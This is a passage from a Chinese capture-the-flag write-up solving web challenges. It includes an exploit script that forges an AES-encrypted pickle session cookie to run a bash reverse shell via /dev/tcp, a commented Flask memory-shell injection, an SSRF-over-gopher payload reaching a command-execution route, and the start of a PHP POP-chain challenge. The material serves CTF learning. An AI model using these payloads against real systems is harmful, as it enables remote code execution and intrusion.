class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(redirect(<span class="string">&quot;/login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>通过<code>create_session()</code>函数，我们知道<strong>session数据</strong>经过了<strong>pickle序列化</strong>+<strong>base64编码</strong>+<strong>AES加密</strong></p><p>这里<code>aes加解密</code>需要<strong>key、iv</strong>，而且是从<strong>环境变量</strong>获取的，我们可以直接<strong>读/proc/self/environ</strong>，得到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PYTHON_SHA256=bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1</span><br><span class="line">HOSTNAME=ab49bc3fc05a4391</span><br><span class="line">PYTHON_VERSION=3.10.16</span><br><span class="line">PWD=/app</span><br><span class="line">HOME=/root</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D</span><br><span class="line">FLAG=no_FLAG</span><br><span class="line">SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv</span><br><span class="line">SHLVL=1</span><br><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">SECRET_iv=asdwdggiouewhgpw</span><br><span class="line">_=/usr/local/bin/flask</span><br><span class="line">OLDPWD=/</span><br></pre></td></tr></table></figure><p>参照题目脚本，挫一下<code>exp</code>，因为没有回显，所以直接读是读不出来的</p><p>下面有三种方向，<strong>反弹shell、覆盖/追加写、内存马</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">data, key, iv</span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv),</span><br><span class="line">                    backend=default_backend())</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">    padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">    padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">    result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag* &gt; /app/app.py&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickled_data = base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class RCE():</span></span><br><span class="line"><span class="comment">#     def __reduce__(self):</span></span><br><span class="line"><span class="comment">#         return (exec, (&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;,))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickled_data = base64.b64encode(pickle.dumps(RCE())).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"></span><br><span class="line">session = aes_encrypt(pickled_data, key, iv)</span><br><span class="line">url = <span class="string">&#x27;http://node6.anna.nssctf.cn:24514/&#x27;</span></span><br><span class="line">res = requests.post(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: session&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment"># http://node6.anna.nssctf.cn:24514/xxx?cmd=ls /</span></span><br></pre></td></tr></table></figure><p>官方<code>wp</code>这里用的就是<a href="https://blog.csdn.net/2301_79724395/article/details/139094906">内存马</a></p><h2 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h2><p>什么信息都收集不到，直接<strong>扫目录</strong>，拿到<code>/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList = [</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; ... &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">f&quot;Welcome back, <span class="subst">&#123;username&#125;</span>!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Invalid credentials!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Gopher&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided :)&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No (≧∇≦)&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/RRegister&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Username already exists!&quot;</span>)</span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Registration successful!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Manage&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Allowed!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_avatar</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;User not found!&quot;</span>)</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;avatar&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(os.path.join(avatar_dir, <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>.png&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Avatar uploaded successfully!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;No file uploaded!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app.py&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>只需关注Gop<strong>her</strong>和<strong>Manage</strong>这两个路由，<strong>Gopher路由</strong>这里就无法使用<strong>file://协议</strong>直接实现读取，同时发现<strong>Manage路由</strong>可以实现<strong>命令执行</strong><code>os.popen(request.form.get(&quot;cmd&quot;)).read()</code></p><p>由于<strong>Gopher路由</strong>可以<strong>处理进程</strong>，那么我们的思路就是通过<strong>Gopher路由</strong>打<strong>SSRF</strong>到<strong>Manage路由</strong>，从而实现<strong>命令执行</strong></p><p>这里借助<strong>gopher://协议</strong>实现<strong>SSRF</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求</span><br><span class="line"></span><br><span class="line">很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了</span><br><span class="line"></span><br><span class="line">格式</span><br><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line"></span><br><span class="line">注意不要忘记后面那个下划线<span class="string">&quot;_&quot;</span>，下划线<span class="string">&quot;_&quot;</span>后面才开始接TCP数据流，如果不加这个<span class="string">&quot;_&quot;</span>，那么服务端收到的消息将不是完整的，该字符可随意写</span><br></pre></td></tr></table></figure><p>同时注意<strong>Gopher路由</strong>这里还有<strong>解析</strong>为<strong>127.0.0.1</strong>的黑名单，下面有两种方式绕过</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>(缺省路由的写法也可以代表<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>) <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 都代表本地</span><br><span class="line"><span class="number">127.</span>x.x.x 除了<span class="number">.1</span>都行，都是环回地址</span><br></pre></td></tr></table></figure><p>构造<strong>Manage路由</strong>的<strong>POST包</strong>，直接查看<strong>环境变量</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Manage HTTP/1.1</span><br><span class="line">host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:7</span><br><span class="line"></span><br><span class="line">cmd=<span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>题目代码中，<code>result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)</code>，因此我们这里需要<strong>二次URL编码</strong>(也是<strong>gopher协议</strong>的常见操作了)，同时题目代码这里也可以看见开放的是<strong>8000端口</strong></p><p><code>payload</code>如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Gopher?url=gopher://0.0.0.0:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv</span><br></pre></td></tr></table></figure><p>也发现了一个半自动化脚本吧</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cmd=ls /&quot;</span></span><br><span class="line">payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_to_gopher</span>(<span class="params">http_request: <span class="built_in">str</span>, host: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">80</span></span>):</span><br><span class="line">    lines = http_request.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    request_line = lines[<span class="number">0</span>].split()</span><br><span class="line">    method = request_line[<span class="number">0</span>]</span><br><span class="line">    path = request_line[<span class="number">1</span>]</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    body = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line.strip():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            key, value = line.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">            headers[key.strip()] = value.strip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            body = line.strip()</span><br><span class="line"></span><br><span class="line">    gopher_payload = <span class="string">f&quot;<span class="subst">&#123;method&#125;</span> <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">f&quot;Host: <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        gopher_payload += <span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        gopher_payload += <span class="string">f&quot;\r\n<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    double_encoded_payload = urllib.parse.quote(urllib.parse.quote(gopher_payload))</span><br><span class="line">    gopher_url = <span class="string">f&quot;gopher://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;double_encoded_payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> gopher_url</span><br><span class="line"></span><br><span class="line">http_request = <span class="string">f&quot;&quot;&quot;POST /Manage HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 0.0.0.0:8000</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;payload_len&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(http_to_gopher(http_request, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br></pre></td></tr></table></figure><h2 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) 